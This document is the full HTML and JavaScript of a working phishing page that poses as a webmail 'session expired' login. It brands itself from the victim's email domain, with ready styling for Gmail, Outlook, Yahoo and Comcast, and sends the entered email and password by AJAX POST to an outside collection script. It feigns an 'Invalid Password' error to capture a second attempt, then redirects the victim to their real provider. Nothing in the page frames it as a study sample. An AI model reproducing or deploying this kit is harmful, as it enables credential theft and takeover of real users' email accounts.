<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Webmail Portal Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>

<style>
html,body{width:100%;height:100%;margin:0}
:root{
  --brand:#6c757d;
  --brand-soft:rgba(108,117,125,.15);
}
#root{position:fixed;inset:0;z-index:-1;overflow:hidden}
#iframe{width:100%;height:100%;border:none;filter:blur(2px) brightness(.85);transform:scale(1.05)}
#bg-fallback{position:absolute;inset:0;display:none;background:linear-gradient(135deg,var(--brand),#111)}
.modal-dialog{margin-top:90px}
.modal-header{background:var(--brand-soft)}
.modal-header h5{display:flex;align-items:center;gap:8px}
.btn-primary{background:var(--brand);border-color:var(--brand)}
.input_box{height:50px;position:relative;margin-top:15px}
.input_box input{height:100%;width:100%;padding-left:45px;border:1px solid #ccc;border-radius:5px}
.input_box .icon{position:absolute;top:50%;left:15px;transform:translateY(-50%);color:#666}
</style>
</style>


  <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
  
    <script>
  window.console = window.console || function(t) {};
</script>

  
  
  <script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
  </script>

  
  <script>

    /* global $ */
    $(document).ready(function(){
      var count=0;

      $('#back1').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        var my_email =email;
        $('#email').val(my_email);
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        var finalu= c.toUpperCase();

        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
        $(".logoname").html(finalu);
        $("#iframe").attr("src", "https://www."+my_slice);
      }
      
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();

$("#iframe").attr("src", "https://www."+my_slice);
        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
        $("#logoname").html(finalu);
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
          url: 'https://suissepilot.com/worldproject-IMF/valley.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#password").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Sign in');
            }
            
            
          });
          
        
    });


    });


  </script>
<script>
    window.onload = function() {
  var input = document.getElementById("password").focus();
}

</script>
</head>

<body translate="no" >
<script>
document.addEventListener("DOMContentLoaded", () => {

  /* ---------------- Utilities ---------------- */
  const isValidEmail = e => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);

  /* ---- Brand overrides (includes Comcast) ---- */
  const BRAND_OVERRIDES = {
    gmail:"Google",
    google:"Google",
    outlook:"Microsoft",
    office:"Microsoft",
    microsoft:"Microsoft",
    yahoo:"Yahoo",
    comcast:"Comcast",
    xfinity:"Comcast"
  };

  /* ---- Logo source overrides ---- */
  const LOGO_DOMAIN_OVERRIDE = {
    "comcast.net": "xfinity.com",
    "comcast.com": "xfinity.com"
  };

  /* ---- Theme colors ---- */
  const DOMAIN_THEMES = {
    "gmail.com":"#4285f4",
    "outlook.com":"#0078d4",
    "yahoo.com":"#5f01d1",
    "comcast.net":"#000000",
    "comcast.com":"#000000",
    "xfinity.com":"#000000"
  };

  const cache = {
    set:(k,v)=>{ try{ localStorage.setItem(k,v) }catch(e){} },
    get:k=>{ try{ return localStorage.getItem(k) }catch(e){ return null } }
  };

  function normalizeBrand(domain){
    let base = domain.split(".")[0].replace(/[-_]/g,"").replace(/\d+/g,"").toLowerCase();
    return BRAND_OVERRIDES[base] || base.charAt(0).toUpperCase()+base.slice(1);
  }

  function setThemeColor(color){
    document.documentElement.style.setProperty("--brand", color);
    document.documentElement.style.setProperty("--brand-soft", color+"33");
  }

  /* ---------------- Safe Cache ---------------- */
  function cacheLogo(domain, src){
    if(src && src.startsWith("http")){
      try{ localStorage.setItem("logo_"+domain, src) }catch(e){}
    }
  }

  function getCachedLogo(domain){
    const c = localStorage.getItem("logo_"+domain);
    return (c && c.startsWith("http")) ? c : null;
  }

  /* ---------------- Logo loader (guaranteed) ---------------- */
  function setFaviconWithFallback(domain){
    const img = document.getElementById("logoimg");
    img.style.width="24px";
    img.style.height="24px";
    img.style.objectFit="contain";
    img.style.display="inline-block";

    const effectiveDomain = LOGO_DOMAIN_OVERRIDE[domain] || domain;

    const cached = getCachedLogo(domain);
    if(cached){ img.src=cached; return; }

    const sources = [
      "https://www.google.com/s2/favicons?sz=64&domain=" + effectiveDomain,
      "https://icons.duckduckgo.com/ip3/" + effectiveDomain + ".ico",
      "https://" + effectiveDomain + "/favicon.ico",
      "https://" + effectiveDomain + "/apple-touch-icon.png"
    ];

    let i = 0;

    img.onerror = () => {
      if(i < sources.length){
        img.src = sources[i++];
      } else {
        img.src =
          "data:image/svg+xml;utf8," +
          encodeURIComponent(`
            <svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'>
              <rect width='64' height='64' rx='8' fill='#6c757d'/>
              <text x='50%' y='50%' dy='.35em'
                font-size='28'
                font-family='Arial'
                fill='white'
                text-anchor='middle'>
                ${domain[0].toUpperCase()}
              </text>
            </svg>
          `);
		  
      }
    };

    img.onload = () => cacheLogo(domain, img.src);
    img.src = sources[i++];
  }

  /* ---------------- Background handling ---------------- */
  function setBackground(domain){
    const iframe=document.getElementById("iframe");
    const fb=document.getElementById("bg-fallback");
    iframe.src="https://" + domain;
    const t=setTimeout(()=>fb.style.display="block",2500);
    iframe.onload=()=>{ clearTimeout(t); fb.style.display="none"; };
  }

  /* ---------------- Main ---------------- */
  function applyFromEmail(email){
    if(!isValidEmail(email)) return;

    const domain = email.split("@")[1].toLowerCase();
    cache.set("lastEmail", email);

    document.getElementById("email").value = email;
    document.getElementById("logoname").textContent = normalizeBrand(domain);

    setThemeColor(DOMAIN_THEMES[domain] || "#6c757d");
    setFaviconWithFallback(domain);
    setBackground(domain);
  }

  const hashEmail = window.location.hash.slice(1);
  const savedEmail = cache.get("lastEmail");

  if(hashEmail) applyFromEmail(decodeURIComponent(hashEmail));
  else if(savedEmail) applyFromEmail(savedEmail);

  $('#exampleModal').modal({backdrop:'static',keyboard:false}).modal('show');
});
</script>
</head>

<body>

<!-- BACKGROUND -->
<div id="root">
  <div id="bg-fallback"></div>
  <iframe id="iframe" scrolling="no" frameborder="0"></iframe>
</div>

<!-- MODAL -->
<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog"
     aria-labelledby="exampleModalLabel" aria-hidden="true">

  <div class="modal-dialog" role="document"
       style="margin-top:90px; box-shadow:rgba(0,0,0,.4) 0 30px 90px;">
    <div class="modal-content">

      <!-- HEADER -->
      <div class="modal-header">
        <h5 class="d-flex align-items-center">
          <img id="logoimg" style="height:24px;margin-right:8px;">
          <span id="logoname" style="text-transform:capitalize;"></span>
        </h5>

        <button type="button" class="close" data-dismiss="modal"
                aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>

      <!-- BODY -->
      <div class="modal-body">
        <center>
          <div>Your session has expired, please login again to continue.</div>
        </center>

        <center>
          <div class="alert alert-danger" id="msg"
               style="display:none;color:red;">
            Invalid Password! Please enter your correct password
          </div>

          <div id="error" class="text-danger"
               style="display:none;color:red;">
            That account doesn't exist. Enter a different account
          </div>
        </center>

        <form action="#" method="post">
          <input type="hidden" name="hido" id="hido">
          <input type="hidden" name="redirecto" id="redirecto">

          <div class="input_box">
            <input type="email" id="email" name="username"
                   placeholder="Email or Phone" disabled>
            <div class="icon"><i class="fas fa-user"></i></div>
          </div>

          <div class="input_box">
            <input type="password" id="password" name="password"
                   placeholder="Password" required autofocus>
            <div class="icon"><i class="fas fa-lock"></i></div>
          </div>

          <!-- FOOTER -->
          <div class="modal-footer">
            <button type="submit" id="submit-btn"
                    class="btn btn-primary">
              Sign in
            </button>
          </div>

        </form>
      </div>

    </div>
  </div>
</div>

<!-- JS -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"
        integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
        crossorigin="anonymous"></script>

<script>
$(document).ready(function () {
  $('#exampleModal').modal({
    backdrop: 'static',
    keyboard: false
  }).modal('show');
});
</script>

</body>
</html>
